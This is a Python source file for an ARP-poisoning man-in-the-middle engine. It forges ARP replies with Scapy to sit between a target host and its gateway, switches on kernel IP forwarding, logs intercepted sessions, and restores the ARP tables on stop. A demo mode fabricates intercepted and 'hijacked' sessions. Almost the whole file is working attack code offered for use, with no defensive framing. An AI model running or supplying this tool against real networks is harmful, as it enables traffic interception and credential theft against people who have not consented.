"""
MITMEngine  —  ARP-based man-in-the-middle attack engine.

Responsibilities:
  • ARP cache poisoning (target ↔ gateway)
  • Enable / disable kernel IP forwarding
  • Track hijacked sessions
  • Emit log entries via callbacks

Requires root + Scapy.
"""

import threading
import time
import subprocess
import os
from datetime import datetime
from dataclasses import dataclass, field
from typing import Callable, Optional

try:
    from scapy.all import (
        Ether, ARP, IP, TCP, srp, sendp, get_if_hwaddr, conf
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


@dataclass
class Session:
    id: str
    start_time: str
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: str
    bytes_intercepted: int = 0
    status: str = "ACTIVE"    # ACTIVE | CLOSED | HIJACKED

    @property
    def duration(self) -> str:
        return self.start_time


@dataclass
class MITMLogEntry:
    timestamp: str
    level: str       # INFO | WARN | SUCCESS | ERROR
    message: str


class MITMEngine:
    """ARP poisoning MITM. Works in demo mode when Scapy unavailable."""

    def __init__(self):
        self.target_ip:  str = ""
        self.gateway_ip: str = ""
        self.interface:  str = "eth0"
        self._stop_evt   = threading.Event()
        self._arp_thread: Optional[threading.Thread] = None
        self._scan_thread: Optional[threading.Thread] = None

        self.sessions: list[Session] = []
        self.log_entries: list[MITMLogEntry] = []

        # Callbacks
        self.on_log:     Optional[Callable[[MITMLogEntry], None]] = None
        self.on_session: Optional[Callable[[Session], None]] = None
        self.on_stats:   Optional[Callable[[dict], None]] = None

        self.stats = {
            "arp_sent":      0,
            "bytes_relayed": 0,
            "sessions":      0,
            "hijacked":      0,
        }

    # ── public ──────────────────────────────────────────────────────────────

    @property
    def running(self) -> bool:
        return self._arp_thread is not None and self._arp_thread.is_alive()

    def start(self, target: str, gateway: str, iface: str = "eth0"):
        if self.running:
            return
        self.target_ip  = target
        self.gateway_ip = gateway
        self.interface  = iface
        self._stop_evt.clear()

        self._log("INFO", f"Starting MITM: {target} ↔ {gateway} on {iface}")

        if SCAPY_OK:
            self._enable_ip_forward()
            self._arp_thread = threading.Thread(
                target=self._arp_poison_loop,
                daemon=True, name="arp-poison"
            )
            self._arp_thread.start()
        else:
            # Demo mode
            self._arp_thread = threading.Thread(
                target=self._demo_loop,
                daemon=True, name="mitm-demo"
            )
            self._arp_thread.start()

    def stop(self):
        if not self.running:
            return
        self._log("INFO", "Stopping MITM — sending ARP restore packets…")
        self._stop_evt.set()
        if SCAPY_OK:
            self._arp_restore()
            self._disable_ip_forward()
        self._log("SUCCESS", "ARP tables restored. MITM stopped.")
        for s in self.sessions:
            if s.status == "ACTIVE":
                s.status = "CLOSED"

    def get_sessions(self) -> list[Session]:
        return self.sessions

    # ── ARP poisoning ────────────────────────────────────────────────────────

    def _arp_poison_loop(self):
        try:
            tgt_mac = self._get_mac(self.target_ip)
            gwy_mac = self._get_mac(self.gateway_ip)
        except Exception as e:
            self._log("ERROR", f"MAC resolution failed: {e}")
            return

        if not tgt_mac or not gwy_mac:
            self._log("ERROR", "Could not resolve MAC addresses — check target/gateway IPs.")
            return

        self._log("SUCCESS", f"Target MAC:  {tgt_mac}")
        self._log("SUCCESS", f"Gateway MAC: {gwy_mac}")
        self._log("INFO",    "ARP poison loop started (interval: 2s)")

        # Poison packets
        pkt_to_target  = Ether(dst=tgt_mac) / ARP(
            op=2,
            pdst=self.target_ip,  hwdst=tgt_mac,
            psrc=self.gateway_ip,
        )
        pkt_to_gateway = Ether(dst=gwy_mac) / ARP(
            op=2,
            pdst=self.gateway_ip, hwdst=gwy_mac,
            psrc=self.target_ip,
        )

        while not self._stop_evt.is_set():
            try:
                sendp(pkt_to_target,  iface=self.interface, verbose=False)
                sendp(pkt_to_gateway, iface=self.interface, verbose=False)
                self.stats["arp_sent"] += 2
                if self.on_stats:
                    self.on_stats(self.stats.copy())
            except Exception as e:
                self._log("ERROR", f"Send error: {e}")
            time.sleep(2)

    def _arp_restore(self):
        """Send gratuitous ARP to restore correct mappings."""
        try:
            tgt_mac = self._get_mac(self.target_ip)
            gwy_mac = self._get_mac(self.gateway_ip)
            r1 = Ether(dst=tgt_mac)  / ARP(op=2, pdst=self.target_ip,  psrc=self.gateway_ip, hwsrc=gwy_mac)
            r2 = Ether(dst=gwy_mac)  / ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,  hwsrc=tgt_mac)
            for _ in range(4):
                sendp(r1, iface=self.interface, verbose=False)
                sendp(r2, iface=self.interface, verbose=False)
                time.sleep(0.3)
        except Exception:
            pass

    def _get_mac(self, ip: str) -> Optional[str]:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=self.interface, timeout=2, verbose=False,
        )
        if ans:
            return ans[0][1].hwsrc
        return None

    # ── IP forwarding ────────────────────────────────────────────────────────

    def _enable_ip_forward(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
            self._log("SUCCESS", "IP forwarding ENABLED")
        except PermissionError:
            self._log("WARN", "Could not enable IP forwarding (need root)")

    def _disable_ip_forward(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0\n")
            self._log("INFO", "IP forwarding DISABLED")
        except Exception:
            pass

    # ── demo mode ────────────────────────────────────────────────────────────

    def _demo_loop(self):
        import random
        self._log("INFO", "[DEMO] Scapy not available — running simulation")
        self._log("INFO", f"[DEMO] Simulating MITM: {self.target_ip} ↔ {self.gateway_ip}")
        time.sleep(0.8)
        self._log("SUCCESS", "[DEMO] ARP poison packets sent (simulated)")
        self._log("SUCCESS", "[DEMO] IP forwarding enabled (simulated)")

        protocols = ["HTTP","FTP","Telnet","SMTP","POP3"]
        tick = 0
        while not self._stop_evt.is_set():
            tick += 1
            time.sleep(random.uniform(1.5, 4.0))
            self.stats["arp_sent"] += 2

            if random.random() < 0.4:
                port = {"HTTP":80,"FTP":21,"Telnet":23,"SMTP":25,"POP3":110}
                proto = random.choice(protocols)
                sp    = random.randint(40000, 65000)
                sess  = Session(
                    id=f"S{tick:04d}",
                    start_time=datetime.now().strftime("%H:%M:%S"),
                    src_ip=self.target_ip,
                    dst_ip=self.gateway_ip,
                    src_port=sp,
                    dst_port=port[proto],
                    protocol=proto,
                    bytes_intercepted=random.randint(512, 8192),
                    status="ACTIVE",
                )
                self.sessions.append(sess)
                self.stats["sessions"] += 1
                self._log("SUCCESS", f"[DEMO] New {proto} session intercepted: {self.target_ip}:{sp}")
                if self.on_session:
                    self.on_session(sess)

            if random.random() < 0.1 and self.sessions:
                s = random.choice([s for s in self.sessions if s.status == "ACTIVE"] or self.sessions)
                s.status = "HIJACKED"
                self.stats["hijacked"] += 1
                self._log("WARN", f"[DEMO] Session {s.id} marked HIJACKED ({s.protocol})")

            self.stats["bytes_relayed"] += random.randint(1024, 16384)
            if self.on_stats:
                self.on_stats(self.stats.copy())

    # ── helpers ──────────────────────────────────────────────────────────────

    def _log(self, level: str, msg: str):
        entry = MITMLogEntry(
            timestamp=datetime.now().strftime("%H:%M:%S"),
            level=level,
            message=msg,
        )
        self.log_entries.append(entry)
        if self.on_log:
            self.on_log(entry)
